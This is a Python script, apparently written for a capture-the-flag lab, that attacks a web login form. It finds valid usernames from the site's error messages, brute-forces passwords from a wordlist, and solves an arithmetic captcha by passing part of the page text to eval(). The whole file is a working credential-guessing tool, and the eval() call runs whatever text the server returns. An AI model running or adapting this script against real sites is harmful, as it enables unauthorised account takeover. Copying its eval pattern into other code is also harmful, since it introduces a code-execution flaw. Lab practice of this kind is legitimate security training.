#make sure that the captcha is already activated before running this script.

import requests
import os

#edit the target IP
target = "10.201.93.111"

# make sure that the task files are in the same directory
users = open("usernames.txt","r")
passwords = open("passwords.txt", "r")

#do not edit anything below here
captcha = ""
found_user = ""
found_password = ""

print("Enumerating users...")
for each in users:
        each = each.strip()
        r=requests.post("http://" + target + "/login", data={'username':each, 'password':'pass','captcha':captcha})
        output=r.text.split("\n")
        if "does not exist" not in r.text and "Invalid captcha" not in r.text:
                found_user = each
                print("Username: " + found_user)
                break
        captcha_question=output[96]
        captcha = eval(captcha_question[:-4])


print("Enumerating passwords...")
for each in passwords:
        each = each.strip()
        r=requests.post("http://" + target + "/login", data={'username':found_user, 'password':each,'captcha':captcha})
        output=r.text.split("\n")
        if "Invalid password" not in r.text and "Invalid captcha" not in r.text:
                print("Password: " + each)
                found_password = each
                print("--------")
                print("Login Response:")
                print(r.text)
                exit()
        captcha_question=output[96]
        captcha = eval(captcha_question[:-4])
